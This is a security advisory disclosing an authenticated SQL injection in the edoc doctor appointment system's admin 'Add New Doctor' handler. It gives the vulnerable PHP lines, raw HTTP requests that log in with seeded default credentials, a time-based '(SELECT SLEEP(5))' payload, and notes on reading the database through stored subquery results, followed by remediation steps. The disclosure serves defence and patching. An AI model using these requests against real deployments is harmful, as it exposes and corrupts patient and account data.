# edoc-doctor-appointment-system SQL Injection (admin doctor creation)

**CWE-89 · Authenticated (admin) SQL injection, `$spec` unquoted · direct database read via stored subquery return and INSERT tuple rewriting**

> **Vendor:** HashenUdara
> **Product:** edoc-doctor-appointment-system (vanilla PHP + MySQL via mysqli)
> **Affected version:** n/a — main branch @ cc258425b915d1af9e298777ccd26d160493e68d (latest as of 2026-09-27; no official tagged release)
> **Affected endpoints:** `POST /admin/add-new.php` (param `spec`; `email` is also interpolated into the duplicate-check SELECT)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

`admin/add-new.php` (the "Add New Doctor" handler of the admin panel) builds its `INSERT INTO doctor` statement by concatenating the `spec` POST parameter **without surrounding quotes** into the numeric `specialties` position, and executes it with `mysqli::query()`. An authenticated administrator can inject arbitrary SQL expressions; because the injection lands in an unquoted numeric position it needs no quote escaping, and the `specialties` column stores the subquery's return value, giving a direct database read primitive. The endpoint sits behind an admin session, but the repository ships default administrator credentials (`admin@edoc.com` / `<REDACTED>`, a 3-character numeric default vendor password) in `SQL_Database_edoc.sql`, so default deployments expose it in practice.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `admin/add-new.php:25-32` | Admin session gate (`$_SESSION['usertype'] != 'a'` → redirect to login) |
| `admin/add-new.php:44-50` | Reads 7 POST fields (`name`, `nic`, `spec`, `email`, `Tele`, `password`, `cpassword`) with no sanitization |
| `admin/add-new.php:54` | Sink 1 — duplicate-check SELECT interpolates `$email` (injectable, boolean oracle; not separately demonstrated) |
| `admin/add-new.php:59` | Sink 2 — `$sql1` INSERT INTO doctor: `$spec` concatenated **without quotes** |
| `admin/add-new.php:60` / `:62` | Sink 3 — `$sql2` INSERT INTO webuser (raw concatenation, executed unconditionally) |
| `admin/add-new.php:61` | `$database->query($sql1);` |

```php
// admin/add-new.php:46
$spec=$_POST['spec'];

// admin/add-new.php:59  ($spec lands in the numeric specialties position, unquoted)
$sql1="insert into doctor(docemail,docname,docpassword,docnic,doctel,specialties) values('$email','$name','$password','$nic','$tele',$spec);";
$sql2="insert into webuser values('$email','d')";
$database->query($sql1);   // line 61
$database->query($sql2);   // line 62
```

## 3. Prerequisites

- A valid administrator session (`$_SESSION['usertype'] == 'a'`).
- The repository's own `SQL_Database_edoc.sql` (lines 42-43) seeds `admin@edoc.com` / `<REDACTED>` (3-character numeric default vendor password), so deployments loaded from the shipped dump are practically reachable with those default credentials.
- No quote escaping is required: `spec` is concatenated into an unquoted numeric position of the VALUES list.

## 4. Reproduction

Runnable script: [`poc/poc-admin-insert-sqli.py`](poc/poc-admin-insert-sqli.py) (Python 3 stdlib only). Raw request trace: [`poc/http-requests-admin-add-new.txt`](poc/http-requests-admin-add-new.txt). Raw verification log: [`evidence/EDOC-02.txt`](evidence/EDOC-02.txt).

```http
# Log in with the seeded default administrator account
POST /login.php HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

useremail=admin%40edoc.com&userpassword=<REDACTED>
# (password = the shipped seed value from SQL_Database_edoc.sql; redacted here)
# -> 302 Location: admin/index.php; keep PHPSESSID

# Baseline (spec=1); responds in ~0.03 s, doctor row stored with specialties=1
POST /admin/add-new.php HTTP/1.1
Host: target.local
Cookie: PHPSESSID=<admin session>
Content-Type: application/x-www-form-urlencoded

name=DocBase&nic=111&spec=1&email=docbase@test.local&Tele=555&password=pw1&cpassword=pw1

# Payload; spec decodes to: (SELECT SLEEP(5)) - injected unquoted into values(...)
# Responds in ~5.05 s
POST /admin/add-new.php HTTP/1.1
Host: target.local
Cookie: PHPSESSID=<admin session>
Content-Type: application/x-www-form-urlencoded

name=DocInj&nic=222&spec=%28SELECT%20SLEEP%285%29%29&email=docinj@test.local&Tele=556&password=pw2&cpassword=pw2
```

Stored-value proof that the subquery executed inside the INSERT:

```sql
SELECT docemail, specialties FROM doctor
 WHERE docemail IN ('docbase@test.local','docinj@test.local');
-- docbase@test.local | 1
-- docinj@test.local  | 0   <- SLEEP(5) return value stored in specialties
```

## 5. Confirmed Techniques

Manual time-based verification (no sqlmap needed), local isolated instance (MySQL 8.0.39, PHP 8.4.26, `display_errors=0`):

| Request | `spec` value | Response time | Stored `specialties` |
|---|---|---|---|
| Baseline | `1` | 0.034 s | 1 |
| Payload | `(SELECT SLEEP(5))` | 5.051 s | 0 (SLEEP return value) |

A `webuser` row is created for the injected doctor as well (third sink executes unconditionally after the first). The duplicate-check SELECT at line 54 (`$email` interpolated) offers an additional boolean oracle but was not separately demonstrated.

## 6. Impact

- **Direct database read**: the unquoted numeric position stores the subquery's return value (e.g. `(SELECT version())`) in the `specialties` column, which the admin panel then renders — a built-in exfiltration channel; combined with the time-based oracle this permits enumeration of arbitrary database content.
- **Data tampering**: the INSERT tuple can be rewritten to append arbitrary `doctor` / `webuser` rows (the `webuser` table drives account lookups and role routing).
- **Denial of service**: long `SLEEP()` chains tie up PHP workers and database connections.
- **Practical reachability**: although the endpoint requires an administrator session, the shipped SQL dump seeds default administrator credentials, so unmodified deployments are exposed in practice.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N` (Base 5.5 — Medium)

## 8. Remediation

1. Use prepared statements with bound parameters for all three queries (duplicate-check SELECT line 54, doctor INSERT line 59, webuser INSERT line 60).
2. Cast `spec` to an integer server-side (`(int)$_POST['spec']`) since `specialties` is a numeric column.
3. Validate `email` with `filter_var($email, FILTER_VALIDATE_EMAIL)` and reject on failure.
4. Force administrators to replace the credentials shipped in `SQL_Database_edoc.sql` and store password hashes, not plaintext.

## 9. References

- Project: https://github.com/HashenUdara/edoc-doctor-appointment-system
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- External disclosure: https://gist.github.com/qianqiusujiu/e7be453f6188eca39679ed3a5a576cad
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
